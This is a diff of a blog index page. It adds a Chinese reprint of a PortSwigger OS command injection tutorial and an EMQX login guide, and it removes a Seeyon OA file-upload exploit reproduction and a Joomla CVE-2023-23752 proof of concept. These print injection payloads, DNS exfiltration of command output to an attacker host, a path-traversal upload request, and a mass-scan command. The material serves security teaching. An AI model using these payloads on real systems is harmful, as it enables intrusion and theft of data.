@@ -86,6 +86,243 @@
 
     
         <h2 class="title">
+            <a href="/2023/12/07/OS-Command-Injection/">
+                PortSwigger Academy | OS command injection 操作系统命令注入
+            </a>
+        </h2>
+    
+    <time>
+        Dec 7, 2023
+    </time>
+    <section class="content">
+        <h1><span id="portswigger-academy-os-command-injection-操作系统命令注入">PortSwigger Academy | OS command injection : 操作系统命令注入</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42942594/article/details/112474186">en0_0</a> 并作补充</p>
+</blockquote>
+<h2><span id="总结">总结</span></h2><blockquote>
+<ul>
+<li><p><code>&amp;name=1&amp;email=1%401.com||ping+-c+10+127.0.0.1||&amp;subject=1</code> 有时候需要url编码</p>
+</li>
+<li><p><code>productId=1&amp;storeId=1|whoami</code> POST方法不能用<code>&amp;</code></p>
+<p>在本节中，我们将解释什么是OS命令注入，描述如何检测和利用漏洞，为不同的操作系统拼写一些有用的命令和技术，并总结如何防止OS命令注入。</p>
+<p><img src="/2023/12/07/OS-Command-Injection/1.png" alt="image"></p>
+</li>
+</ul>
+</blockquote>
+<h2><span id="什么是os命令注入">什么是OS命令注入？</span></h2><blockquote>
+<p>操作系统命令注入（也称为外壳程序注入）是一个Web安全漏洞，它使攻击者可以在运行应用程序的服务器上执行任意操作系统（OS）命令，并且通常会完全破坏该应用程序及其所有数据。 攻击者通常可以利用OS命令注入漏洞来破坏托管基础结构的其他部分，利用信任关系将攻击转移到组织内的其他系统。</p>
+</blockquote>
+<h2><span id="执行任意命令">执行任意命令</span></h2><blockquote>
+<p>考虑一个购物应用程序，该应用程序使用户可以查看特定商店中某商品是否有库存。 该信息可通过如下网址访问：</p>
+<p><code>https://insecure-website.com/stockStatus?productID=381&amp;storeID=29</code></p>
+<p>为了提供库存信息，应用程序必须查询各种旧系统。 由于历史原因，该功能是通过使用产品和存储ID作为参数调用shell命令来实现的：</p>
+<p><code>stockreport.pl 381 29</code><br>此命令输出指定项目的库存状态，并返回给用户。</p>
+<p>由于该应用程序无法防御OS命令注入，因此攻击者可以提交以下输入以执行任意命令：</p>
+<p><code>&amp; echo aiwefwlguh &amp;</code></p>
+<p>如果此输入是在productID参数中提交的，那么应用程序执行的命令是：</p>
+<p><code>stockreport.pl &amp; echo aiwefwlguh &amp; 29</code></p>
+<p>echo命令只是使提供的字符串在输出中回显，并且是测试某些类型的OS命令注入的有用方法。 &amp; 字符是shell命令分隔符，因此执行的实际上是一个接一个的三个独立命令。 结果，返回给用户的输出为：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Error - productID was not provided</span><br><span class="line">aiwefwlguh</span><br><span class="line">29: command not found</span><br></pre></td></tr></table></figure>
+
+<p>输出的三行表明：</p>
+<p>原始的stockreport.pl命令在没有预期参数的情况下执行，因此返回了错误消息。</p>
+<p>执行注入的echo命令，并且在输出中回显提供的字符串。</p>
+<p>原始参数29作为命令执行，从而导致错误。</p>
+<p>通常，将附加命令分隔符&amp;放置在注入命令之后是很有用的，因为这会将注入命令与注入点后面的内容分开。 这减少了随后发生的事件阻止注入的命令执行的可能性。</p>
+</blockquote>
+<h4><span id="lab-os-command-injection-simple-case">Lab: OS command injection, simple case</span></h4><blockquote>
+<p><code>productId=1&amp;storeId=1|whoami</code></p>
+<p><img src="/2023/12/07/OS-Command-Injection/2.png" alt="image"></p>
+</blockquote>
+<h3><span id="有用的命令">有用的命令</span></h3><blockquote>
+<p>当您确定了OS命令注入漏洞后，通常可以执行一些初始命令来获取有关您受到破坏的系统的信息。 以下是在Linux和Windows平台上有用的一些命令的摘要：</p>
+<table>
+<thead>
+<tr>
+<th>命令目的</th>
+<th>Linux</th>
+<th>Windows</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>当前用户的名称</td>
+<td>whoami</td>
+<td>whoami</td>
+</tr>
+<tr>
+<td>操作系统</td>
+<td>uname -a</td>
+<td>ver</td>
+</tr>
+<tr>
+<td>网络配置</td>
+<td>ifconfig</td>
+<td>ipconfig &#x2F; all</td>
+</tr>
+<tr>
+<td>网络连接</td>
+<td>netstat -an</td>
+<td>netstat -an</td>
+</tr>
+<tr>
+<td>运行进程</td>
+<td>ps -ef</td>
+<td>tasklist</td>
+</tr>
+</tbody></table>
+</blockquote>
+<h2><span id="操作系统命令注入漏洞盲注">操作系统命令注入漏洞盲注</span></h2><blockquote>
+<p>OS命令注入的许多实例都是盲注的漏洞。 这意味着应用程序不会在其HTTP响应中返回命令的输出。 盲注漏洞仍然可以被利用，但是需要不同的技术。</p>
+<p>考虑一个允许用户提交有关该站点的反馈的网站。 用户输入他们的电子邮件地址和反馈消息。 然后，服务器端应用程序会向站点管理员生成一封包含反馈的电子邮件。 为此，它使用提交的详细信息调出邮件程序。 例如：</p>
+<p><code>mail -s &quot;This site is great&quot; -aFrom:peter@normal-user.net feedback@vulnerable-website.com</code></p>
+<p>mail命令的输出（如果有）不会在应用程序的响应中返回，因此使用echo有效负载将无效。 在这种情况下，您可以使用多种其他技术来检测和利用漏洞。</p>
+</blockquote>
+<h3><span id="使用时间延迟检测盲注os命令注入">使用时间延迟检测盲注OS命令注入</span></h3><blockquote>
+<p>您可以使用注入的命令来触发时间延迟，从而允许您根据应用程序响应的时间来确认命令已执行。 ping命令是执行此操作的有效方法，因为它使您可以指定要发送的ICMP数据包的数量，从而指定该命令运行所花费的时间：</p>
+<p><code>&amp; ping -c 10 127.0.0.1 &amp;</code></p>
+<p>此命令将导致应用程序ping其环回网络适配器10秒钟。</p>
+</blockquote>
+<h4><span id="lab-blind-os-command-injection-with-time-delays">Lab: Blind OS command injection with time delays</span></h4><blockquote>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">csrf=j25Ci6owysrme8z4HvkicgC1hqXWr0Yz&amp;name=1&amp;email=1%401.com||ping+-c+10+127.0.0.1||&amp;subject=1&amp;message=1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/12/07/OS-Command-Injection/3.png" alt="image"></p>
+</blockquote>
+<h3><span id="通过重定向输出来利用盲注os命令注入">通过重定向输出来利用盲注OS命令注入</span></h3><blockquote>
+<p>您可以将注入命令的输出重定向到Web根目录下的文件中，然后可以使用浏览器进行检索。 例如，如果应用程序从文件系统位置&#x2F;var&#x2F;www&#x2F;static提供静态资源，则可以提交以下输入：</p>
+<p><code>&amp; whoami&gt; /var/www/static/whoami.txt &amp;</code></p>
+<p><code>&gt;</code>字符将whoami命令的输出发送到指定文件。 然后，您可以使用浏览器获取<a target="_blank" rel="noopener" href="https://vulnerable-website.com/whoami.txt%E6%9D%A5%E6%A3%80%E7%B4%A2%E6%96%87%E4%BB%B6%EF%BC%8C%E5%B9%B6%E6%9F%A5%E7%9C%8B%E6%B3%A8%E5%85%A5%E5%91%BD%E4%BB%A4%E7%9A%84%E8%BE%93%E5%87%BA%E3%80%82">https://vulnerable-website.com/whoami.txt来检索文件，并查看注入命令的输出。</a></p>
+</blockquote>
+<h4><span id="lab-blind-os-command-injection-with-output-redirection">Lab: Blind OS command injection with output redirection</span></h4><blockquote>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;email=1%401.com||whoami+&gt;+/var/www/images/whoami.txt||&amp;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/12/07/OS-Command-Injection/4.png" alt="image"></p>
+</blockquote>
+<h3><span id="利用带外oast技术利用盲目的os命令注入">利用带外（OAST）技术利用盲目的OS命令注入</span></h3><blockquote>
+<p>您可以使用注入的命令，通过OAST技术触发与您控制的系统的带外网络交互。 例如：</p>
+<p><code>&amp; nslookup kgji2ohoyw.web-attacker.com &amp;</code></p>
+<p>此有效负载使用nslookup命令对指定的域进行DNS查找。 攻击者可以监视是否发生了指定的查找，从而检测到命令已成功注入。</p>
+</blockquote>
+<h4><span id="lab-blind-os-command-injection-with-out-of-band-interaction">Lab: Blind OS command injection with out-of-band interaction</span></h4><blockquote>
+<p><img src="/2023/12/07/OS-Command-Injection/5.png" alt="image"></p>
+<p>带外通道还提供了一种从注入的命令中提取输出的简便方法：<br> (根本别啥用)</p>
+<p><code>&amp; nslookup </code>whoami<code>.kgji2ohoyw.web-attacker.com &amp;</code></p>
+<p>这将导致对DNS的攻击者所在域进行域名查询，其中包含whoami命令的结果：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wwwuser.kgji2ohoyw.web-attacker.com</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h4><span id="lab-blind-os-command-injection-with-out-of-band-data-exfiltration">Lab: Blind OS command injection with out-of-band data exfiltration</span></h4><blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">email=1%401.com||nslookup+`whoami`.132kftea48t801xjselcncwfp6vwjl.burpcollaborator.net||</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/12/07/OS-Command-Injection/6.png" alt="image"></p>
+</blockquote>
+<h2><span id="注入os命令的方式">注入OS命令的方式</span></h2><blockquote>
+<p>各种shell字符可用于执行OS命令注入攻击。</p>
+<p>许多字符用作命令分隔符，使命令可以链接在一起。 以下命令分隔符可在基于Windows和Unix的系统上运行：</p>
+<pre><code>&amp;
+&amp;&amp;
+|
+||
+</code></pre>
+<p>以下命令分隔符仅在基于Unix的系统上起作用：</p>
+<pre><code>;
+Newline (0x0a or \n)
+</code></pre>
+<p>在基于Unix的系统上，您还可以使用反引号或美元字符在原始命令中内嵌执行注入命令： （原来如此，windows不能用反引号）</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">`injected-command`</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">( injected-command )</span></span><br></pre></td></tr></table></figure>
+
+<p>请注意，不同的shell元字符具有细微不同的行为，这些行为可能会影响它们是否在某些情况下起作用，以及它们是否允许带内检索命令输出或仅对盲注使用有用。</p>
+<p>有时，您控制的输入会出现在原始命令的引号中。 在这种情况下，需要先使用引号终止上下文（使用”或’），然后再使用适当的外壳元字符来插入新命令。</p>
+</blockquote>
+<h2><span id="如何防止os命令注入攻击">如何防止OS命令注入攻击</span></h2><blockquote>
+<p>到目前为止，防止OS命令注入漏洞的最有效方法是永远不要从应用程序层代码中调用OS命令。 几乎在每种情况下，都有使用更安全的平台API来实现所需功能的替代方法。</p>
+<p>如果认为无法通过用户提供的输入调出OS命令，则必须执行强大的输入验证。 有效验证的一些示例包括：</p>
+<ul>
+<li>根据 允许值 的白名单进行验证。</li>
+<li>验证输入是否为数字。</li>
+<li>验证输入仅包含字母数字字符，不包含其他语法或空格。</li>
+</ul>
+<p>切勿尝试通过转义shell元字符来清理输入。 实际上，这太容易出错，容易被熟练的攻击者绕开。</p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/12/07/EMQX-Server-Login/">
+                配置EMQX服务器用户名/密码方式登录
+            </a>
+        </h2>
+    
+    <time>
+        Dec 7, 2023
+    </time>
+    <section class="content">
+        <h1><span id="配置emqx服务器用户名x2f密码方式登录">配置EMQX服务器用户名&#x2F;密码方式登录</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/cw_huang/article/details/105815345">GEEK.攻城狮</a> 并作补充</p>
+</blockquote>
+<h3><span id="配置环境">配置环境</span></h3><blockquote>
+<p><strong>系统：</strong><a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=ubuntu&spm=1001.2101.3001.7020">ubuntu</a> 18.04server lts</p>
+<p><strong>EMQX版本：v4.0.6</strong></p>
+</blockquote>
+<h3><span id="停止服务">停止服务</span></h3><blockquote>
+<p><code>emqx stop</code></p>
+</blockquote>
+<h3><span id="编辑用户名密码配置文件">编辑用户名密码配置文件</span></h3><blockquote>
+<p><code>vim ./etc/emqx/plugins/emqx_auth_username.conf</code></p>
+<p>增加用户名、密码，密码算法改为plain，透传</p>
+<p><img src="/2023/12/07/EMQX-Server-Login/1.png" alt="image"></p>
+</blockquote>
+<h3><span id="关闭匿名登录">关闭匿名登录</span></h3><blockquote>
+<p><code>vim /etc/emqx/emqx.conf</code></p>
+<p>查找allow_anonymous，修改为false</p>
+<p><img src="/2023/12/07/EMQX-Server-Login/2.png" alt="image"></p>
+<p>启动emqx服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">emqx start</span><br></pre></td></tr></table></figure>
+
+
+
+<p>进入后台管理界面，启动用户名密码认证。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://服务器IP:18083</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/12/07/EMQX-Server-Login/3.png" alt="image"></p>
+</blockquote>
+<h3><span id="此时使用mqtt之前的匿名方式的配置已经无法登录">此时，使用MQTT之前的匿名方式的配置，已经无法登录</span></h3><blockquote>
+<p><img src="/2023/12/07/EMQX-Server-Login/4.png" alt="image"></p>
+<p>MQTT.FX上，添加用户名密码：</p>
+<p><img src="/2023/12/07/EMQX-Server-Login/5.png" alt="image"></p>
+<p>此时可以通过用户名密码登录，订阅主题</p>
+<p><img src="/2023/12/07/EMQX-Server-Login/6.png" alt="image"></p>
+<p>同样的方式，我们需要再添加一个用户，用于两个用户之间通讯。</p>
+<p>我们可以从服务器端登录一个用户，向MQTT.FX客户端订阅的TOPIC发送信息。可以看到正常收到。</p>
+<p><img src="/2023/12/07/EMQX-Server-Login/7.png" alt="image"></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/EMQX/" rel="tag">EMQX</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
             <a href="/2023/12/06/Fishing-WiFi/">
                 kali搭建钓鱼WiFi
             </a>
@@ -811,149 +1048,6 @@
         
             <div class="tags">
                 <a class="tag-none-link" href="/tags/Apktool/" rel="tag">Apktool</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2023/11/08/Upload-Seeyon/">
-                致远OA wpsAssistServlet 任意文件上传漏洞 漏洞复现
-            </a>
-        </h2>
-    
-    <time>
-        Nov 8, 2023
-    </time>
-    <section class="content">
-        <h1><span id="致远oa-wpsassistservlet-任意文件上传漏洞-漏洞复现">致远OA wpsAssistServlet 任意文件上传漏洞 漏洞复现</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq2539879928/article/details/127811791">Vista、</a> 并作补充</p>
-</blockquote>
-<h2><span id="01-漏洞描述">01 漏洞描述</span></h2><blockquote>
-<p>致远OA是一套办公协同管理软件。致远OA wpsAssistServlet接口存在任意文件上传漏洞，攻击者通过漏洞可以发送特定的请求包上传恶意文件，获取服务器权限。</p>
-</blockquote>
-<h2><span id="02-影响范围">02 影响范围</span></h2><blockquote>
-<p>致远OA A6、A8、A8N (V8.0SP2，V8.1，V8.1SP1)<br>致远OA G6、G6N (V8.1、V8.1SP1)</p>
-</blockquote>
-<h2><span id="03-利用方式">03 利用方式</span></h2><blockquote>
-<p>1、调用文件上传接口上传测试文件，请求包如下：</p>
-</blockquote>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/seeyon/wpsAssistServlet?flag=save&amp;realFileType=../../../../ApacheJetspeed/webapps/ROOT/test.jsp&amp;fileId=2</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>349</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">--59229605f98b8cf290a7b8908b34616b</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;upload&quot;; filename=&quot;test.txt&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: application/vnd.ms-excel</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">&lt;% <span class="keyword">out</span>.println(&quot;seeyon_vuln&quot;);%&gt;</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">--59229605f98b8cf290a7b8908b34616b--</span></span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>2、文件上传成功时，响应情况如下图所示：<br><img src="/2023/11/08/Upload-Seeyon/1.png" alt="image"> </p>
-</blockquote>
-<blockquote>
-<p>3、访问上传文件:<a target="_blank" rel="noopener" href="http://xx.xx.xx.xx/test.jsp,%E5%8F%91%E7%8E%B0%E8%AF%A5%E6%96%87%E4%BB%B6%E6%88%90%E5%8A%9F%E8%A2%AB%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E3%80%82">http://xx.xx.xx.xx/test.jsp,发现该文件成功被服务器解析。</a><br><img src="/2023/11/08/Upload-Seeyon/2.png" alt="image"><br><img src="/2023/11/08/Upload-Seeyon/3.png" alt="image"></p>
-</blockquote>
-<h2><span id="04-修复方案">04 修复方案</span></h2><blockquote>
-<p>1、对路径 &#x2F;seeyon&#x2F;htmlofficeservlet 进行限制访问。<br>2、致远官方已发布补丁，请联系官方安装相应补丁。</p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Seeyon/" rel="tag">Seeyon</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2023/11/08/CVE-2023-23752-Joomla/">
-                CVE-2023-23752 POC Joomla! 未授权访问漏洞
-            </a>
-        </h2>
-    
-    <time>
-        Nov 8, 2023
-    </time>
-    <section class="content">
-        <h1><span id="cve-2023-23752-poc-joomla-未授权访问漏洞">CVE-2023-23752 POC Joomla! 未授权访问漏洞</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://www.ddosi.org/cve-2023-23752/">雨苁</a> 并作补充</p>
-</blockquote>
-<h2><span id="漏洞描述">漏洞描述</span></h2><blockquote>
-<p>在 Joomla! 版本为4.0.0 到 4.2.7中发现了一个漏洞,可以对 web 服务端点进行未经授权访问。</p>
-</blockquote>
-<h2><span id="漏洞详情">漏洞详情</span></h2><blockquote>
-<p>项目： Joomla！<br>子项目： CMS<br>影响：严重<br>严重性： 高<br>概率：高<br>版本： 4.0.0-4.2.7<br>利用类型：不正确的访问控制<br>报告日期： 2023-02-13<br>修复日期： 2023-02-16<br>CVE 编号： CVE​​-2023-23752</p>
-</blockquote>
-<h2><span id="描述">描述</span></h2><blockquote>
-<p>不正确的访问检查允许对 web 服务端点进行未经授权的访问。</p>
-</blockquote>
-<h2><span id="受影响的版本">受影响的版本</span></h2><blockquote>
-<p>Joomla! CMS 版本 4.0.0-4.2.7</p>
-</blockquote>
-<h2><span id="解决方案">解决方案</span></h2><blockquote>
-<p>升级到版本 4.2.8</p>
-</blockquote>
-<h2><span id="joomla安全中心公告">Joomla!安全中心公告</span></h2><blockquote>
-<p><a target="_blank" rel="noopener" href="https://developer.joomla.org/security-centre">https://developer.joomla.org/security-centre</a><br><img src="/2023/11/08/CVE-2023-23752-Joomla/1.png" alt="image"> </p>
-</blockquote>
-<h2><span id="poc">POC</span></h2><blockquote>
-<p><code>/api/index.php/v1/config/application?public=true</code></p>
-</blockquote>
-<h3><span id="批量测试">批量测试</span></h3><blockquote>
-<p><code>httpx -l ip.txt -path &#39;/api/index.php/v1/config/application?public=true&#39;</code></p>
-</blockquote>
-<h2><span id="测试效果">测试效果</span></h2><blockquote>
-<p><img src="/2023/11/08/CVE-2023-23752-Joomla/2.png" alt="image"></p>
-</blockquote>
-<h2><span id="漏洞分析">漏洞分析</span></h2><blockquote>
-<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12175">https://xz.aliyun.com/t/12175</a><br>Joomla(CVE-2023-23752)——一个请求参数 打穿Rest API<br>由于公司对漏洞的要求比较高，代码审计很快集中到了请求路由的代码块。不管是Wordpress&#x2F;RounderCube还是PhpMyAdmin以及一些知名度比较高的php应用（一个Java安全研究员感到头皮发麻），我的重点对象变成了请求路由的代码追踪，一旦分析经过路由选择之后，剩下的业务代码我是完全不看了。虽然有点不专业，但是这是挖掘未授权漏洞最好的道路，最终终于找到了一个不错的高危漏洞——Joomla未授权访问Rest API。</p>
-</blockquote>
-<h2><span id="受影响版本">受影响版本</span></h2><blockquote>
-<p>Joomla大致有三个路由入口，分别是：<br>根目录的index.php(用户访问文章)<br>根目录的administrator&#x2F;index.php(管理员管理)<br>根目录的api&#x2F;index.php(开发者爱好的Rest API)<br>未授权的接口正是第三个入口。因此影响的只有Joomla4.0.0——Joomla4.2.7（Rest API 4.x正式开发）</p>
-</blockquote>
-<h2><span id="分析">分析</span></h2><blockquote>
-<p>这里仅重点分析api&#x2F;index.php这个路由的问题（index.php和administrator&#x2F;index.php找不到漏洞）。<br>网站输入&#x2F;api&#x2F;index.php开启debug模式<br><img src="/2023/11/08/CVE-2023-23752-Joomla/3.png" alt="image"></p>
-</blockquote>
-<blockquote>
-<p>index.php会来到app.php。其中$app主要的input成员存放所有的HTTP请求参数<br><img src="/2023/11/08/CVE-2023-23752-Joomla/4.png" alt="image"></p>
-</blockquote>
-<blockquote>
-<p>在execute()函数中，会经过sanityCheckSystemVariables函数，此函数用来过滤渲染模板的参数，主要防止XSS漏洞。setupLogging和createExtensionNameSpaceMap主要是系统的额外记录工作。doExecute就是具体的路由逻辑函数。<br><img src="/2023/11/08/CVE-2023-23752-Joomla/5.png" alt="image"><br>doExecute中最重要的就是route和dispatch函数。</p>
-</blockquote>
-<h2><span id="route路由选择与鉴权">route：路由选择与鉴权</span></h2><blockquote>
-<p>整个route函数分为两部分，路由选择和身份校验。<br><img src="/2023/11/08/CVE-2023-23752-Joomla/6.png" alt="image"></p>
-</blockquote>
-<blockquote>
-<p>逻辑十分清晰，主要是直接通过parseApiRoute函数从请求的方法和url到$routers中找到对应的路由信息<br><img src="/2023/11/08/CVE-2023-23752-Joomla/7.png" alt="image"></p>
-</blockquote>
-<blockquote>
-<p>身份验证的代码加上debug信息可以知道public参数控制着API是否对外开放。默认情况下是false，不对外开放。但是这里大部分情况都会选择直接下一步。但是回过头看路由获取parseApiRoute时会有新的发现<br><img src="/2023/11/08/CVE-2023-23752-Joomla/8.png" alt="image"></p>
-</blockquote>
-<blockquote>
-<p>这里发送请求<br><code>http://x.x.x.x/api/index.php/v1/banners?public=true</code><br>再来看route变量会发现惊喜<br><img src="/2023/11/08/CVE-2023-23752-Joomla/9.png" alt="image"><br>此时route.var中的变量会被请求的变量覆盖。由于public&#x3D;true，所以接口不需要身份验证，直接到达路由分发，也就是业务逻辑。</p>
-</blockquote>
-<h2><span id="受损的api清单">受损的API清单</span></h2><blockquote>
-<p>由于能够直接访问API了，从中找到最终的信息即可。<br><code>/api/index.php/v1/config/application?public=true</code><br>此API用于获取网站最重要的配置信息，其中包含数据库的账号与密码。<br>其他受损API如下</p>
-</blockquote>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span 